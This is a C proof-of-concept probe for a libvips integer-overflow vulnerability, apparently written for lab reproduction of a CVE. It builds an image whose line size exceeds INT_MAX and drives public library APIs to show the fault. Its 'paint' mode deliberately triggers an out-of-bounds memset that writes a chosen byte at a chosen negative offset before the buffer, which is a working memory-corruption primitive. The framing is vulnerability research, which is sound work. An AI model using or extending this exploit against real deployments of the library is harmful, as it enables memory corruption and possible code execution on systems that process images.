/* Real-consumer probe for CVE-2026-69242, lab only.
 *
 * The TIFF header accepted by the real loader has this geometry:
 *   Xsize=107374, Ysize=2, Bands=10000, 32-bit samples
 *   sizeof_line=4294960000 > INT_MAX, sizeof_image=8589920000.
 * Decoding its 8.6 GB of pixels is CPU-bound and does not finish inside a
 * bounded lab wake (see PROVENANCE.md). This probe instead builds a real
 * libvips memory image with the same geometry, allocates the real 8.6 GB
 * buffer with vips_image_write_prepare(), and drives real consumer APIs:
 *
 *   region  - vips_region_prepare() + pinned VIPS_REGION_ADDR(reg,0,1)
 *   extract - vips_extract_area() + vips_image_write_to_memory()
 *
 * No synthetic struct, no direct vips_region_paint_pel() call, no network,
 * no command execution and no marker claim.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vips/vips.h>

static VipsImage *
make_image(void)
{
	VipsImage *im = vips_image_new_memory();

	im->Xsize = 107374;
	im->Ysize = 2;
	im->Bands = 10000;
	im->BandFmt = VIPS_FORMAT_UINT;
	im->Coding = VIPS_CODING_NONE;
	im->Type = VIPS_INTERPRETATION_MULTIBAND;

	if (vips_image_write_prepare(im)) {
		printf("PREPARE=ERR msg=%s\n", vips_error_buffer());
		vips_error_clear();
		g_object_unref(im);
		return NULL;
	}
	printf("IMAGE Xsize=%d Ysize=%d Bands=%d BandFmt=%d "
		"sizeof_line=%" G_GUINT64_FORMAT
		" sizeof_image=%" G_GUINT64_FORMAT " data=%p\n",
		im->Xsize, im->Ysize, im->Bands, im->BandFmt,
		VIPS_IMAGE_SIZEOF_LINE(im), VIPS_IMAGE_SIZEOF_IMAGE(im),
		(void *) im->data);
	fflush(stdout);
	return im;
}

int
main(int argc, char **argv)
{
	const char *mode = argc > 1 ? argv[1] : "region";
	VipsImage *im;

	if (VIPS_INIT(argv[0]))
		return 1;
	if (!(im = make_image()))
		return 0;

	if (!strcmp(mode, "region")) {
		VipsRegion *reg = vips_region_new(im);
		VipsRect r;
		int rc;
		unsigned char v;

		r.left = 0;
		r.top = 0;
		r.width = 4;
		r.height = 2;
		rc = vips_region_prepare(reg, &r);
		printf("REGION_PREPARE=%d data=%p bpl=%d lskip=%llu "
			"valid={%d,%d,%d,%d} msg=%s\n",
			rc, (void *) reg->data, reg->bpl,
			(unsigned long long) VIPS_REGION_LSKIP(reg),
			reg->valid.left, reg->valid.top,
			reg->valid.width, reg->valid.height,
			vips_error_buffer());
		vips_error_clear();
		fflush(stdout);
		if (rc == 0 && reg->valid.height >= 2) {
			v = *VIPS_REGION_ADDR(reg, 0, 1);
			printf("LINE1_BYTE=%02x\n", v);
			fflush(stdout);
		}
		g_object_unref(reg);
	}
	else if (!strcmp(mode, "paint")) {
		/* vips_region_paint() is a public API. For an int image it
		 * memsets each line at VIPS_REGION_ADDR(reg,x,y) and advances
		 * by VIPS_REGION_LSKIP (region.c:922-923). With bpl=-7296 the
		 * second line lands before the real allocation, so the second
		 * memset writes a chosen value at a chosen negative offset.
		 */
		VipsRegion *reg = vips_region_new(im);
		VipsRect r;
		int rc;

		r.left = 0;
		r.top = 0;
		r.width = 4;
		r.height = 2;
		rc = vips_region_prepare(reg, &r);
		printf("PAINT_PREPARE=%d data=%p bpl=%d lskip=%llu "
			"valid={%d,%d,%d,%d} msg=%s\n",
			rc, (void *) reg->data, reg->bpl,
			(unsigned long long) VIPS_REGION_LSKIP(reg),
			reg->valid.left, reg->valid.top,
			reg->valid.width, reg->valid.height, vips_error_buffer());
		vips_error_clear();
		fflush(stdout);
		if (rc == 0 && reg->valid.height >= 2) {
			printf("PAINT_CALL value=0x5a wd=%" G_GUINT64_FORMAT "\n",
				(guint64) (4 * VIPS_IMAGE_SIZEOF_PEL(im)));
			fflush(stdout);
			printf("PAINT_ADDR0=%p ADDR1=%p\n",
				(void *) VIPS_REGION_ADDR(reg, 0, 0),
				(void *) VIPS_REGION_ADDR(reg, 0, 1));
			fflush(stdout);
			vips_region_paint(reg, &r, 0x5a);
			printf("PAINT_DONE\n");
			fflush(stdout);
		}
		g_object_unref(reg);
	}
	else if (!strcmp(mode, "extract")) {
		VipsImage *out = NULL;
		void *buf;
		size_t len;

		if (vips_extract_area(im, &out, 0, 0, 4, 2, NULL)) {
			printf("EXTRACT=ERR msg=%s\n", vips_error_buffer());
			vips_error_clear();
		}
		else {
			printf("EXTRACT=OK Xsize=%d Ysize=%d Bands=%d "
				"sizeof_line=%" G_GUINT64_FORMAT "\n",
				out->Xsize, out->Ysize, out->Bands,
				VIPS_IMAGE_SIZEOF_LINE(out));
			fflush(stdout);
			buf = vips_image_write_to_memory(out, &len);
			if (!buf) {
				printf("WRITE_MEM=ERR msg=%s\n", vips_error_buffer());
				vips_error_clear();
			}
			else {
				printf("WRITE_MEM=OK len=%zu\n", len);
				g_free(buf);
			}
			fflush(stdout);
			g_object_unref(out);
		}
	}
	else {
		printf("MODE_UNKNOWN=%s\n", mode);
	}

	g_object_unref(im);
	vips_shutdown();
	return 0;
}
